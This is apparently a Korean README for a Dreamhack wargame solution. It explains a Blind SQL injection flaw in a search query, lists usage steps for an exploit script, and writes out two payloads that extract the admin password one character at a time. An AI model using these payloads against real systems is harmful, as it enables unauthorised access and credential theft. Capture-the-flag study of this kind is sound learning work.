# 🔐 Dreamhack Challenge: Secret Data System Exploit

이 저장소는 **Dreamhack**의 "[Secret Data System](https://dreamhack.io/wargame/challenges/2762)" 문제를 해결하기 위한 **Blind SQL Injection** 자동화 스크립트를 포함하고 있습니다.

## 📝 문제 개요
- **문제 유형**: Web Hacking / SQL Injection
- **주요 취약점**: `search` 기능 내에서 사용자 입력값이 필터링 없이 SQL 쿼리에 삽입되어 발생하는 **Blind SQL Injection**.
- **목표**: `users` 테이블에서 `admin` 계정의 `password`를 추출하여 관리자 패널에 접속.

## 🛠️ 취약점 분석
`search` 함수에서 다음과 같은 형태의 취약한 쿼리가 실행됩니다:
```python
sql = f"SELECT COUNT(*) FROM secret_data WHERE title LIKE '%{query}%'"
```

## 🚀 사용 방법
### 1. 요구 사항
이 스크립트는 Python 3와 requests 라이브러리를 필요로 합니다.
```Bash
pip install requests
```
### 2. 실행 방법
드림핵 문제 서버를 실행하고 생성된 접속 주소를 복사합니다.
exploit.py 파일 내의 url 변수에 복사한 주소를 넣습니다.
스크립트를 실행합니다.
```Bash
python exploit.py
```

## 🔍 페이로드 설명
스크립트에서 사용하는 핵심 페이로드는 다음과 같습니다:

* 길이 확인: %' AND (SELECT LENGTH(password) FROM users WHERE username='admin')={length} --

* 데이터 추출: %' AND (SELECT SUBSTR(password, {index}, 1) FROM users WHERE username='admin')='{char}' --

## 🏁 결과
추출된 16진수 16자리 비밀번호를 통해 관리자 계정(admin)으로 로그인하여 플래그를 획득할 수 있습니다.

```Plaintext
Found Password: 47fde8735375aef8
```

---
본 코드는 학습 목적으로 작성되었으며, 허가되지 않은 시스템에 대한 공격 용도로 사용해서는 안 됩니다.
